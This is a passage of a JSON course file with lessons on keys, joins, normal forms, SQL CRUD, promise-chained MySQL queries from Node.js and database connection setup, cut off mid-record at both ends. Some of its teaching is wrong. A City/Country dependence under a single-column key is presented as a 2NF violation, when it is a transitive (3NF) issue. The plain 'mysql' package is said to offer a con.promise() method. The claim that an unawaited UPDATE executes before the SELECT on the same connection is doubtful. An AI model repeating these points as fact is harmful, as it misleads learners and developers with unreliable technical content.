key","text":"Primary key and foreign key"},{"kind":"callout","variant":"example","html":"\u003cp\u003eA clinic needs to track patients and their visits. Patient Sara Brown has \u003ccode\u003epatientid = 1\u003c/code\u003e. Her two visits get \u003ccode\u003evisitid = 1\u003c/code\u003e and \u003ccode\u003evisitid = 2\u003c/code\u003e, both with \u003ccode\u003epatientid = 1\u003c/code\u003e as the foreign key. The FK connects each visit row back to Sara&#39;s single patient row — one patient, two visits.\u003c/p\u003e","text":"A clinic needs to track patients and their visits. Patient Sara Brown has `patientid = 1`. Her two visits get `visitid = 1` and `visitid = 2`, both with `patientid = 1` as the foreign key. The FK connects each visit row back to Sara's single patient row — one patient, two visits."},{"kind":"p","html":"The \u003ccode\u003ePatient\u003c/code\u003e table gets a \u003ccode\u003epatientid\u003c/code\u003e column declared as a \u003cstrong\u003eprimary key\u003c/strong\u003e — a column that uniquely identifies each row and cannot be NULL. The \u003ccode\u003eVisit\u003c/code\u003e table gets its own \u003ccode\u003evisitid\u003c/code\u003e primary key, plus a \u003ccode\u003epatientid\u003c/code\u003e column declared as a \u003cstrong\u003eforeign key\u003c/strong\u003e — a column that references \u003ccode\u003ePatient.patientid\u003c/code\u003e. The foreign key is the mechanical link between the two tables.","text":"The `Patient` table gets a `patientid` column declared as a **primary key** — a column that uniquely identifies each row and cannot be NULL. The `Visit` table gets its own `visitid` primary key, plus a `patientid` column declared as a **foreign key** — a column that references `Patient.patientid`. The foreign key is the mechanical link between the two tables."},{"kind":"code","lang":"sql","code":"CREATE TABLE `patient` (\n  `patientid` int(11) NOT NULL,\n  `name` varchar(100) DEFAULT NULL,\n  PRIMARY KEY(patientid)\n);\n\nCREATE TABLE `visit` (\n  `visitid` int(11) NOT NULL,\n  `patientid` int(11) NOT NULL,\n  `visitDate` date NOT NULL,\n  PRIMARY KEY(visitid),\n  CONSTRAINT fk_has_patient FOREIGN KEY(patientid)\n    REFERENCES patient(patientid)\n);"},{"kind":"h2","html":"The 1:M relationship","text":"The 1:M relationship"},{"kind":"p","html":"One patient can have many visit rows. That structure is a 1:M (one-to-many) relationship. The &quot;one&quot; side holds the primary key (\u003ccode\u003ePatient.patientid\u003c/code\u003e). The &quot;many&quot; side holds the matching foreign key (\u003ccode\u003eVisit.patientid\u003c/code\u003e).","text":"One patient can have many visit rows. That structure is a 1:M (one-to-many) relationship. The \"one\" side holds the primary key (`Patient.patientid`). The \"many\" side holds the matching foreign key (`Visit.patientid`)."},{"kind":"mermaid","source":"erDiagram\n    PATIENT {\n        int patientid PK\n        varchar name\n    }\n    VISIT {\n        int visitid PK\n        int patientid FK\n        date visitDate\n    }\n    PATIENT ||--o{ VISIT : \"has\""},{"kind":"checkpoint","q":"Jack Ma exists in the `patient` table but has no rows in `visit`. What does `SELECT * FROM patient, visit WHERE patient.patientid = visit.patientid` return for Jack Ma?","a":"Nothing. The WHERE clause requires a matching `patientid` in `visit`. Jack Ma has no visit rows, so he is excluded."},{"kind":"h2","html":"Referential integrity","text":"Referential integrity"},{"kind":"p","html":"Referential integrity means every foreign key value points to an existing primary key value. Two consequences follow directly. First, the parent table (\u003ccode\u003epatient\u003c/code\u003e) must be created before the child table (\u003ccode\u003evisit\u003c/code\u003e) — the foreign key constraint cannot reference a table that does not yet exist. Second, deleting a patient row leaves any matching visit rows without a valid parent, producing orphan rows that violate integrity.","text":"Referential integrity means every foreign key value points to an existing primary key value. Two consequences follow directly. First, the parent table (`patient`) must be created before the child table (`visit`) — the foreign key constraint cannot reference a table that does not yet exist. Second, deleting a patient row leaves any matching visit rows without a valid parent, producing orphan rows that violate integrity."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eA Cartesian join (\u003ccode\u003eSELECT * FROM patient, visit\u003c/code\u003e) returns n×m rows — the product of both row counts. It does not filter by matching columns. Even if both tables share a column name, the row count stays n×m. Add a WHERE clause to get only matched pairs.\u003c/p\u003e","text":"A Cartesian join (`SELECT * FROM patient, visit`) returns n×m rows — the product of both row counts. It does not filter by matching columns. Even if both tables share a column name, the row count stays n×m. Add a WHERE clause to get only matched pairs."},{"kind":"h2","html":"M:M relationships and junction tables","text":"M:M relationships and junction tables"},{"kind":"p","html":"Books and authors illustrate M:M (many-to-many): one author can write many books; one book can have many authors. A foreign key alone cannot represent both directions. The solution is a junction table (\u003ccode\u003eAuthorBook\u003c/code\u003e) with two foreign key columns — \u003ccode\u003eauthorid\u003c/code\u003e and \u003ccode\u003ebookid\u003c/code\u003e — forming a composite primary key. This decomposes M:M into two 1:M relationships: \u003ccode\u003eAuthor\u003c/code\u003e → \u003ccode\u003eAuthorBook\u003c/code\u003e and \u003ccode\u003eBook\u003c/code\u003e → \u003ccode\u003eAuthorBook\u003c/code\u003e.","text":"Books and authors illustrate M:M (many-to-many): one author can write many books; one book can have many authors. A foreign key alone cannot represent both directions. The solution is a junction table (`AuthorBook`) with two foreign key columns — `authorid` and `bookid` — forming a composite primary key. This decomposes M:M into two 1:M relationships: `Author` → `AuthorBook` and `Book` → `AuthorBook`."},{"kind":"h2","html":"First normal form (1NF) and second normal form (2NF)","text":"First normal form (1NF) and second normal form (2NF)"},{"kind":"p","html":"\u003cstrong\u003eFirst normal form (1NF):\u003c/strong\u003e every column holds a single atomic value; no repeating groups; each row is unique. A column storing \u003ccode\u003e&quot;Paris, France&quot;\u003c/code\u003e as one value violates 1NF.","text":"**First normal form (1NF):** every column holds a single atomic value; no repeating groups; each row is unique. A column storing `\"Paris, France\"` as one value violates 1NF."},{"kind":"p","html":"\u003cstrong\u003eSecond normal form (2NF):\u003c/strong\u003e satisfies 1NF, and every non-key column depends on the entire primary key — not a partial subset of it. A table with \u003ccode\u003ePersonID\u003c/code\u003e as the primary key and columns \u003ccode\u003eCity\u003c/code\u003e and \u003ccode\u003eCountry\u003c/code\u003e can satisfy 1NF (each cell holds one value) yet still violate 2NF if \u003ccode\u003eCity\u003c/code\u003e and \u003ccode\u003eCountry\u003c/code\u003e depend on each other rather than on \u003ccode\u003ePersonID\u003c/code\u003e alone.","text":"**Second normal form (2NF):** satisfies 1NF, and every non-key column depends on the entire primary key — not a partial subset of it. A table with `PersonID` as the primary key and columns `City` and `Country` can satisfy 1NF (each cell holds one value) yet still violate 2NF if `City` and `Country` depend on each other rather than on `PersonID` alone."},{"kind":"checkpoint","q":"A table has columns `PersonID (PK)`, `Name`, `City`, `Country`. Each cell holds exactly one value. Does it satisfy 1NF? Does it satisfy 2NF?","a":"It satisfies 1NF — all values are atomic. It violates 2NF — `Country` depends on `City`, not on `PersonID`."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e Split entities into separate tables. Assign a primary key to each. Link tables with foreign keys. Verify every non-key column depends on the whole primary key, not on another non-key column.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":24,"id":"sql-crud","title":"SQL CRUD: querying and modifying data","hook":"SELECT, INSERT, UPDATE, DELETE — four operations that cover everything you do to a relational DB.","tags":["SQL","SELECT","INSERT","UPDATE","DELETE","WHERE","JOIN","CRUD","GROUP-BY","subquery"],"module":"Databases and CRUD","source":"Slide 5, Slide 7, Quiz 10","blocks":[{"kind":"h2","html":"The Cartesian problem","text":"The Cartesian problem"},{"kind":"p","html":"Run \u003ccode\u003eSELECT * FROM patient, visit\u003c/code\u003e and you get every patient row paired with every visit row. Three patients and three visits produce nine rows — most of them nonsense.","text":"Run `SELECT * FROM patient, visit` and you get every patient row paired with every visit row. Three patients and three visits produce nine rows — most of them nonsense."},{"kind":"code","lang":"sql","code":"-- Wrong: Cartesian product (3 × 3 = 9 rows)\nSELECT * FROM patient, visit;\n\n-- Right: equi-join on matching patientid (3 matched rows)\nSELECT * FROM patient, visit\nWHERE patient.patientid = visit.patientid;"},{"kind":"p","html":"The WHERE clause constrains the join. Without it, the database pairs every row in the left table with every row in the right table — this is called a Cartesian product.","text":"The WHERE clause constrains the join. Without it, the database pairs every row in the left table with every row in the right table — this is called a Cartesian product."},{"kind":"h2","html":"SELECT: reading rows","text":"SELECT: reading rows"},{"kind":"callout","variant":"example","html":"\u003cp\u003eFind all countries with more than 2 customers. Step 1: \u003ccode\u003eSELECT Country, COUNT(CustomerID) FROM Customers GROUP BY Country\u003c/code\u003e groups rows by country. Step 2: add \u003ccode\u003eHAVING COUNT(CustomerID) &gt; 2\u003c/code\u003e to keep only groups where the count exceeds 2. The WHERE clause cannot do this — it fires before grouping, so the count doesn&#39;t exist yet.\u003c/p\u003e","text":"Find all countries with more than 2 customers. Step 1: `SELECT Country, COUNT(CustomerID) FROM Customers GROUP BY Country` groups rows by country. Step 2: add `HAVING COUNT(CustomerID) \u003e 2` to keep only groups where the count exceeds 2. The WHERE clause cannot do this — it fires before grouping, so the count doesn't exist yet."},{"kind":"p","html":"\u003ccode\u003eSELECT *\u003c/code\u003e retrieves every column. List specific column names to retrieve only what you need.","text":"`SELECT *` retrieves every column. List specific column names to retrieve only what you need."},{"kind":"code","lang":"sql","code":"SELECT * FROM Customers;\nSELECT CustomerName FROM Customers;\nSELECT DISTINCT Country FROM Customers;"},{"kind":"p","html":"\u003ccode\u003eDISTINCT\u003c/code\u003e drops duplicate values from the result. If ten customers share the same country, \u003ccode\u003eDISTINCT Country\u003c/code\u003e returns that country once.","text":"`DISTINCT` drops duplicate values from the result. If ten customers share the same country, `DISTINCT Country` returns that country once."},{"kind":"p","html":"Filter rows with \u003ccode\u003eWHERE\u003c/code\u003e:","text":"Filter rows with `WHERE`:"},{"kind":"code","lang":"sql","code":"SELECT * FROM Customers WHERE Country = 'Mexico';\nSELECT CustomerName FROM Customers WHERE City = 'London';"},{"kind":"p","html":"WHERE operators include \u003ccode\u003e=\u003c/code\u003e, \u003ccode\u003eBETWEEN\u003c/code\u003e, \u003ccode\u003eLIKE\u003c/code\u003e, and \u003ccode\u003eIN\u003c/code\u003e. SQL keywords are not case-sensitive — \u003ccode\u003eselEct\u003c/code\u003e and \u003ccode\u003eSELECT\u003c/code\u003e are identical. Table names are also case-insensitive.","text":"WHERE operators include `=`, `BETWEEN`, `LIKE`, and `IN`. SQL keywords are not case-sensitive — `selEct` and `SELECT` are identical. Table names are also case-insensitive."},{"kind":"checkpoint","q":"What does `SELECT DISTINCT Country FROM Customers` return when 50 customers share 5 countries?","a":"Five rows — one per unique country value."},{"kind":"h2","html":"INSERT: adding rows","text":"INSERT: adding rows"},{"kind":"code","lang":"sql","code":"INSERT INTO patient VALUES\n  (1, 'Sara Brown'),\n  (2, 'John Smith'),\n  (3, 'Jack Ma');\n\nINSERT INTO visit VALUES\n  (1, 1, '2002-01-01'),\n  (2, 2, '2018-08-08'),\n  (3, 2, '2019-09-09');"},{"kind":"p","html":"A single INSERT can load multiple rows at once by separating value tuples with commas.","text":"A single INSERT can load multiple rows at once by separating value tuples with commas."},{"kind":"h2","html":"GROUP BY and HAVING","text":"GROUP BY and HAVING"},{"kind":"p","html":"GROUP BY collapses rows into groups, letting aggregate functions like \u003ccode\u003eCOUNT\u003c/code\u003e operate per group.","text":"GROUP BY collapses rows into groups, letting aggregate functions like `COUNT` operate per group."},{"kind":"code","lang":"sql","code":"SELECT Country, COUNT(CustomerID)\nFROM Customers\nGROUP BY Country;"},{"kind":"p","html":"Filter groups with HAVING — not WHERE. WHERE runs before grouping and cannot see aggregate results.","text":"Filter groups with HAVING — not WHERE. WHERE runs before grouping and cannot see aggregate results."},{"kind":"code","lang":"sql","code":"-- Wrong: WHERE cannot reference an aggregate alias\nSELECT Country, COUNT(CustomerID) AS c\nFROM Customers\nWHERE c \u003e 2\nGROUP BY Country;\n\n-- Right: HAVING runs after grouping\nSELECT Country, COUNT(CustomerID) AS c\nFROM Customers\nGROUP BY Country\nHAVING c \u003e 2;\n\n-- Wrong: WHERE must come BEFORE GROUP BY\nSELECT Country, COUNT(CustomerID)\nFROM Customers\nGROUP BY Country\nWHERE Country LIKE 'A%';\n\n-- Right: WHERE before GROUP BY, HAVING after\nSELECT Country, COUNT(CustomerID)\nFROM Customers\nWHERE Country LIKE 'A%'\nGROUP BY Country;"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003ePlacing WHERE after GROUP BY is a syntax error. Filtering on an aggregate with WHERE (instead of HAVING) also fails — the database evaluates WHERE before it computes the aggregate.\u003c/p\u003e","text":"Placing WHERE after GROUP BY is a syntax error. Filtering on an aggregate with WHERE (instead of HAVING) also fails — the database evaluates WHERE before it computes the aggregate."},{"kind":"p","html":"Clause order: \u003ccode\u003eSELECT → FROM → WHERE → GROUP BY → HAVING\u003c/code\u003e.","text":"Clause order: `SELECT → FROM → WHERE → GROUP BY → HAVING`."},{"kind":"checkpoint","q":"You want countries where customer count exceeds 10. Which clause does the filtering?","a":"HAVING — because the count is an aggregate computed after GROUP BY."},{"kind":"h2","html":"Subqueries","text":"Subqueries"},{"kind":"p","html":"A subquery is a SELECT inside another SELECT. It runs first and passes its result to the outer query.","text":"A subquery is a SELECT inside another SELECT. It runs first and passes its result to the outer query."},{"kind":"code","lang":"sql","code":"-- All products priced above the average\nSELECT * FROM Products\nWHERE price \u003e (SELECT AVG(price) FROM Products);\n\n-- The most expensive product(s)\nSELECT * FROM Products\nWHERE price = (SELECT MAX(price) FROM Products);"},{"kind":"p","html":"Use \u003ccode\u003e=\u003c/code\u003e for a subquery that returns one value and \u003ccode\u003eIN\u003c/code\u003e when it returns a set. The MAX example uses \u003ccode\u003e=\u003c/code\u003e but uses \u003ccode\u003e=\u003c/code\u003e correctly only when exactly one row holds the maximum price — use \u003ccode\u003eIN\u003c/code\u003e if ties are possible.","text":"Use `=` for a subquery that returns one value and `IN` when it returns a set. The MAX example uses `=` but uses `=` correctly only when exactly one row holds the maximum price — use `IN` if ties are possible."},{"kind":"h2","html":"LIKE wildcard","text":"LIKE wildcard"},{"kind":"p","html":"\u003ccode\u003eLIKE\u003c/code\u003e matches patterns. \u003ccode\u003e%\u003c/code\u003e matches zero or more characters; \u003ccode\u003e_\u003c/code\u003e matches exactly one.","text":"`LIKE` matches patterns. `%` matches zero or more characters; `_` matches exactly one."},{"kind":"code","lang":"sql","code":"SELECT * FROM Customers WHERE Country LIKE 'A%';"},{"kind":"p","html":"This returns every country starting with &#39;A&#39;.","text":"This returns every country starting with 'A'."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e Four rules prevent most SQL mistakes: join with a WHERE condition (not a bare comma), use HAVING (not WHERE) on aggregates, put WHERE before GROUP BY, and wrap subquery comparisons in \u003ccode\u003e=\u003c/code\u003e or \u003ccode\u003eIN\u003c/code\u003e depending on whether the subquery returns one value or many.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":25,"id":"sql-promises","title":"Async DB queries with promises: chaining successive SQL calls","hook":"You can't run an UPDATE before confirming the row exists — promises enforce that order.","tags":["promises","async-db","mysql","chaining","successive-queries"],"module":"Databases and CRUD","source":"Slide 11","blocks":[{"kind":"h2","html":"The problem: two queries that must run in order","text":"The problem: two queries that must run in order"},{"kind":"p","html":"A \u003ccode\u003ePUT /patients/:id\u003c/code\u003e route needs to do two things: confirm the patient record exists, then update it. You cannot fire the UPDATE first — you risk modifying a nonexistent row or returning a misleading success response.","text":"A `PUT /patients/:id` route needs to do two things: confirm the patient record exists, then update it. You cannot fire the UPDATE first — you risk modifying a nonexistent row or returning a misleading success response."},{"kind":"p","html":"That ordering constraint is not free. The \u003ccode\u003emysql\u003c/code\u003e module&#39;s default query API is callback-based and does not wait for one query to finish before the next starts.","text":"That ordering constraint is not free. The `mysql` module's default query API is callback-based and does not wait for one query to finish before the next starts."},{"kind":"h2","html":"Callback nesting: it works, but it compounds","text":"Callback nesting: it works, but it compounds"},{"kind":"p","html":"The callback approach wraps the UPDATE inside the SELECT callback so the second query only runs after the first resolves.","text":"The callback approach wraps the UPDATE inside the SELECT callback so the second query only runs after the first resolves."},{"kind":"code","lang":"js","code":"const mysql = require('mysql');\nconst con = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'mydb'\n});\n\nfunction checkAndUpdate(patientId, newName) {\n  return new Promise((resolve, reject) =\u003e {\n    con.query(\n      'SELECT * FROM patient WHERE patientid = ?',\n      [patientId],\n      (err, rows) =\u003e {\n        if (err) return reject(err);\n        if (rows.length === 0) return reject(new Error('Patient not found'));\n\n        con.query(\n          'UPDATE patient SET name = ? WHERE patientid = ?',\n          [newName, patientId],\n          (err2, result) =\u003e {\n            if (err2) return reject(err2);\n            resolve(result);\n          }\n        );\n      }\n    );\n  });\n}"},{"kind":"p","html":"Two levels of nesting are manageable. Add a third query — say, log the change to an audit table — and the nesting grows into &quot;callback hell&quot;: hard to read, hard to handle errors uniformly.","text":"Two levels of nesting are manageable. Add a third query — say, log the change to an audit table — and the nesting grows into \"callback hell\": hard to read, hard to handle errors uniformly."},{"kind":"callout","variant":"example","html":"\u003cp\u003e\u003ccode\u003ePUT /patients/42\u003c/code\u003e needs to confirm the patient exists before updating the name. Step 1: \u003ccode\u003eawait promiseCon.query(&#39;SELECT * FROM patient WHERE patientid = ?&#39;, [42])\u003c/code\u003e — if \u003ccode\u003erows.length === 0\u003c/code\u003e, throw immediately. Step 2: \u003ccode\u003eawait promiseCon.query(&#39;UPDATE patient SET name = ? WHERE patientid = ?&#39;, [&#39;Ada&#39;, 42])\u003c/code\u003e. The second query never runs if the first check fails.\u003c/p\u003e","text":"`PUT /patients/42` needs to confirm the patient exists before updating the name. Step 1: `await promiseCon.query('SELECT * FROM patient WHERE patientid = ?', [42])` — if `rows.length === 0`, throw immediately. Step 2: `await promiseCon.query('UPDATE patient SET name = ? WHERE patientid = ?', ['Ada', 42])`. The second query never runs if the first check fails."},{"kind":"h2","html":"mysql.promise(): convert the connection to promise-based","text":"mysql.promise(): convert the connection to promise-based"},{"kind":"p","html":"\u003ccode\u003emysql\u003c/code\u003e exposes a \u003ccode\u003e.promise()\u003c/code\u003e method on any connection object. Calling \u003ccode\u003econ.promise()\u003c/code\u003e returns a promise-based wrapper around the same underlying connection. Every \u003ccode\u003equery()\u003c/code\u003e call on that wrapper returns a Promise instead of taking a callback.","text":"`mysql` exposes a `.promise()` method on any connection object. Calling `con.promise()` returns a promise-based wrapper around the same underlying connection. Every `query()` call on that wrapper returns a Promise instead of taking a callback."},{"kind":"code","lang":"js","code":"const con = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'mydb'\n});\n\nconst promiseCon = con.promise();"},{"kind":"p","html":"\u003ccode\u003epromiseCon.query(sql, params)\u003c/code\u003e resolves with \u003ccode\u003e[rows, fields]\u003c/code\u003e — a two-element array. Destructure the first element to access the result rows:","text":"`promiseCon.query(sql, params)` resolves with `[rows, fields]` — a two-element array. Destructure the first element to access the result rows:"},{"kind":"code","lang":"js","code":"const [rows] = await promiseCon.query('SELECT * FROM patient WHERE patientid = ?', [id]);"},{"kind":"h2","html":".then() chaining: SELECT then UPDATE","text":".then() chaining: SELECT then UPDATE"},{"kind":"p","html":"With a promise-based connection, chain \u003ccode\u003e.then()\u003c/code\u003e calls to enforce the ordering constraint explicitly.","text":"With a promise-based connection, chain `.then()` calls to enforce the ordering constraint explicitly."},{"kind":"code","lang":"js","code":"promiseCon\n  .query('SELECT * FROM patient WHERE patientid = ?', [patientId])\n  .then(([rows]) =\u003e {\n    if (rows.length === 0) throw new Error('Patient not found');\n    return promiseCon.query(\n      'UPDATE patient SET name = ? WHERE patientid = ?',\n      [newName, patientId]\n    );\n  })\n  .then(([result]) =\u003e {\n    console.log('Updated rows:', result.affectedRows);\n  })\n  .catch(err =\u003e {\n    console.error('DB error:', err.message);\n  });"},{"kind":"p","html":"Each \u003ccode\u003e.then()\u003c/code\u003e receives the resolved value of the previous promise. Throwing inside \u003ccode\u003e.then()\u003c/code\u003e skips remaining \u003ccode\u003e.then()\u003c/code\u003e handlers and jumps to \u003ccode\u003e.catch()\u003c/code\u003e.","text":"Each `.then()` receives the resolved value of the previous promise. Throwing inside `.then()` skips remaining `.then()` handlers and jumps to `.catch()`."},{"kind":"checkpoint","q":"What does `promiseCon.query()` resolve with, and how do you extract just the rows?","a":"It resolves with `[rows, fields]`. Destructure the first element: `const [rows] = await promiseCon.query(...)`."},{"kind":"h2","html":"async/await equivalent","text":"async/await equivalent"},{"kind":"p","html":"\u003ccode\u003easync/await\u003c/code\u003e is syntactic sugar over \u003ccode\u003e.then()\u003c/code\u003e chaining. The ordering guarantee is identical.","text":"`async/await` is syntactic sugar over `.then()` chaining. The ordering guarantee is identical."},{"kind":"code","lang":"js","code":"async function updateIfExists(patientId, newName) {\n  const [rows] = await promiseCon.query(\n    'SELECT * FROM patient WHERE patientid = ?',\n    [patientId]\n  );\n  if (rows.length === 0) throw new Error('Patient not found');\n\n  const [result] = await promiseCon.query(\n    'UPDATE patient SET name = ? WHERE patientid = ?',\n    [newName, patientId]\n  );\n  return result;\n}"},{"kind":"p","html":"\u003ccode\u003eawait\u003c/code\u003e suspends \u003ccode\u003eupdateIfExists\u003c/code\u003e until the Promise settles. Execution resumes at the next line only after the query resolves.","text":"`await` suspends `updateIfExists` until the Promise settles. Execution resumes at the next line only after the query resolves."},{"kind":"checkpoint","q":"Why does `async/await` enforce query ordering where a plain fire-and-forget approach does not?","a":"`await` pauses the function until the awaited Promise settles. The next query only starts after the previous one has resolved."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eFiring the UPDATE without awaiting the SELECT produces a race condition. Both queries enter the MySQL queue simultaneously. The UPDATE executes before the SELECT result arrives. You skip the existence check entirely and write to a row that may not exist — with no error thrown.\u003c/p\u003e","text":"Firing the UPDATE without awaiting the SELECT produces a race condition. Both queries enter the MySQL queue simultaneously. The UPDATE executes before the SELECT result arrives. You skip the existence check entirely and write to a row that may not exist — with no error thrown."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e Use \u003ccode\u003econ.promise()\u003c/code\u003e to get a promise-based query interface, then chain \u003ccode\u003e.then()\u003c/code\u003e or \u003ccode\u003eawait\u003c/code\u003e successive queries to guarantee ordering. Two SQL statements that depend on each other&#39;s results always need explicit sequencing.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":26,"id":"nodejs-db-connect","title":"Node.js MySQL connection: setup, query, and hosting","hook":"mysql is not built-in — three steps connect your Node.js server to a relational database.","tags":["mysql","nodejs","npm","XAMPP","phpMyAdmin","cPanel","hosting"],"module":"Databases and CRUD","source":"Slide 5, Slide 7, Quiz 7","blocks":[{"kind":"p","html":"Your Node.js server needs to store and retrieve data. MySQL runs the database, but Node.js cannot talk to it without a dedicated module. The \u003ccode\u003emysql\u003c/code\u003e package bridges that gap.","text":"Your Node.js server needs to store and retrieve data. MySQL runs the database, but Node.js cannot talk to it without a dedicated module. The `mysql` package bridges that gap."},{"kind":"h2","html":"The three-step connection pattern","text":"The three-step connection pattern"},{"kind":"callout","variant":"example","html":"\u003cp\u003eSlide 5 shows this exact sequence: \u003ccode\u003enpm install mysql\u003c/code\u003e → \u003ccode\u003emysql.createConnection({host, user, password, database})\u003c/code\u003e → \u003ccode\u003econ.connect(cb)\u003c/code\u003e → \u003ccode\u003econ.query(sql, cb)\u003c/code\u003e where the INSERT result is only accessible inside the callback. Each step depends on the previous completing successfully.\u003c/p\u003e","text":"Slide 5 shows this exact sequence: `npm install mysql` → `mysql.createConnection({host, user, password, database})` → `con.connect(cb)` → `con.query(sql, cb)` where the INSERT result is only accessible inside the callback. Each step depends on the previous completing successfully."},{"kind":"p","html":"Unlike \u003ccode\u003ehttp\u003c/code\u003e, \u003ccode\u003efs\u003c/code\u003e, or \u003ccode\u003epath\u003c/code\u003e, the \u003ccode\u003emysql\u003c/code\u003e module is not built into Node.js. Run \u003ccode\u003enpm install mysql\u003c/code\u003e in your project directory before anything else.","text":"Unlike `http`, `fs`, or `path`, the `mysql` module is not built into Node.js. Run `npm install mysql` in your project directory before anything else."},{"kind":"p","html":"Once installed, the pattern has three steps:","text":"Once installed, the pattern has three steps:"},{"kind":"p","html":"\u003cstrong\u003eStep 1 — Install and require\u003c/strong\u003e","text":"**Step 1 — Install and require**"},{"kind":"code","lang":"js","code":"const mysql = require('mysql');"},{"kind":"p","html":"\u003cstrong\u003eStep 2 — Create a connection object\u003c/strong\u003e","text":"**Step 2 — Create a connection object**"},{"kind":"code","lang":"js","code":"const con = mysql.createConnection({\n  host: 'localhost',\n  user: 'yourusername',\n  password: 'yourpassword',\n  database: 'mydb'\n});"},{"kind":"p","html":"\u003cstrong\u003eStep 3 — Connect, then query inside the callback\u003c/strong\u003e","text":"**Step 3 — Connect, then query inside the callback**"},{"kind":"code","lang":"js","code":"con.connect(function(err) {\n  if (err) throw err;\n  console.log('Connected!');\n\n  con.query('INSERT INTO score (name, score) VALUES (\"Elon Musk\", 100)', function(err, result) {\n    if (err) throw err;\n    console.log('Record inserted');\n  });\n});"},{"kind":"p","html":"Results from \u003ccode\u003econ.query()\u003c/code\u003e are only available inside its callback. The query is asynchronous — code on the line after \u003ccode\u003econ.query(...)\u003c/code\u003e runs before the database responds.","text":"Results from `con.query()` are only available inside its callback. The query is asynchronous — code on the line after `con.query(...)` runs before the database responds."},{"kind":"h2","html":"XAMPP: one-click local MySQL","text":"XAMPP: one-click local MySQL"},{"kind":"p","html":"XAMPP installs two things at once: the MySQL database engine, and phpMyAdmin — a web-based admin tool that runs on PHP. Start MySQL from the XAMPP control panel, then click Admin to open \u003ccode\u003ehttp://localhost/phpmyadmin/\u003c/code\u003e. From there you can create databases, create tables, and run raw SQL from the SQL tab.","text":"XAMPP installs two things at once: the MySQL database engine, and phpMyAdmin — a web-based admin tool that runs on PHP. Start MySQL from the XAMPP control panel, then click Admin to open `http://localhost/phpmyadmin/`. From there you can create databases, create tables, and run raw SQL from the SQL tab."},{"kind":"p","html":"Slide 7 demonstrates creating a \u003ccode\u003epatient\u003c/code\u003e table visually in phpMyAdmin. The \u003ccode\u003eAUTO_INCREMENT\u003c/code\u003e attribute lets MySQL assign a unique \u003ccode\u003epatientid\u003c/code\u003e automatically on each INSERT — you do not supply that column value yourself.","text":"Slide 7 demonstrates creating a `patient` table visually in phpMyAdmin. The `AUTO_INCREMENT` attribute lets MySQL assign a unique `patientid` automatically on each INSERT — you do not supply that column value yourself."},{"kind":"h2","html":"Credentials belong on the server, never the client","text":"Credentials belong on the server, never the client"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eThe \u003ccode\u003emysql\u003c/code\u003e module is an \u003cstrong\u003eexternal\u003c/strong\u003e module — it does not ship with Node.js. Forgetting \u003ccode\u003enpm install mysql\u003c/code\u003e causes a &quot;Cannot find module&quot; error at runtime. \u003ccode\u003eurl\u003c/code\u003e, \u003ccode\u003ehttp\u003c/code\u003e, \u003ccode\u003efs\u003c/code\u003e, \u003ccode\u003epath\u003c/code\u003e, and \u003ccode\u003eos\u003c/code\u003e ARE built-in; \u003ccode\u003emysql\u003c/code\u003e is NOT.\u003c/p\u003e","text":"The `mysql` module is an **external** module — it does not ship with Node.js. Forgetting `npm install mysql` causes a \"Cannot find module\" error at runtime. `url`, `http`, `fs`, `path`, and `os` ARE built-in; `mysql` is NOT."},{"kind":"p","html":"Placing your database connection code in client-side JavaScript exposes your username and password to anyone who views the page source. Always run \u003ccode\u003emysql\u003c/code\u003e connection logic inside your server-side Node.js file. The browser never sees it.","text":"Placing your database connection code in client-side JavaScript exposes your username and password to anyone who views the page source. Always run `mysql` connection logic inside your server-side Node.js file. The browser never sees it."},{"kind":"checkpoint","q":"You try `const mysql = require('mysql')` and Node.js throws \"Cannot find module 'mysql'\". What is the most likely cause?","a":"The `mysql` package has not been installed. Run `npm install mysql` in the project directory first."},{"kind":"checkpoint","q":"A query returns `undefined` when you try to log `result` on the line after `con.query(...)`. Why?","a":"`con.query` is asynchronous. `result` is only defined inside the callback function — it does not exist yet on the next synchronous line."},{"kind":"h2","html":"Hosting on cPanel","text":"Hosting on cPanel"},{"kind":"p","html":"To deploy to shared hosting, create a database user in cPanel, assign it privileges on your database, then update the \u003ccode\u003ehost\u003c/code\u003e value in \u003ccode\u003ecreateConnection\u003c/code\u003e from \u003ccode\u003e&#39;localhost&#39;\u003c/code\u003e to your remote database host. The rest of the connection pattern stays the same.","text":"To deploy to shared hosting, create a database user in cPanel, assign it privileges on your database, then update the `host` value in `createConnection` from `'localhost'` to your remote database host. The rest of the connection pattern stays the same."},{"kind":"p","html":"For local development, \u003ccode\u003enodemon\u003c/code\u003e (installed via \u003ccode\u003enpm install nodemon\u003c/code\u003e) restarts the Node.js process automatically when you save a file. Regular \u003ccode\u003enode\u003c/code\u003e does not restart on changes.","text":"For local development, `nodemon` (installed via `npm install nodemon`) restarts the Node.js process automatically when you save a file. Regular `node` does not restart on changes."},{"kind":"callout","variant":"takeaway","html":"\u003cp\u003eThree steps connect Node.js to MySQL: \u003ccode\u003enpm install mysql\u003c/code\u003e, \u003ccode\u003emysql.createConnection({...})\u003c/code\u003e, then \u003ccode\u003econ.connect()\u003c/code\u003e with all queries nested inside its callback. Keep credentials server-side. Use XAMPP locally, cPanel for production hosting.\u003c/p\u003e","text":"Three steps connect Node.js to MySQL: `npm install mysql`, `mysql.createConnection({...})`, then `con.connect()` with all queries nested inside its callback. Keep credentials server-side. Use XAMPP locally, cPanel for production hosting."}]},{"n":27,"id":"promises-basics","title":"Promises: Constructor, States, and Eager Execution","hook":"A function can only return one value — but an async operation can succeed or fail. A Promise solves that mismatch.","tags":["promises","resolve","reject","pending","fulfilled","rejected","executor"],"module":"Promises and Async Programming","source":"Slide 6, ISAQuiz8","blocks":[{"kind":"p","html":"A function that makes an HTTP request cannot return the response directly — the 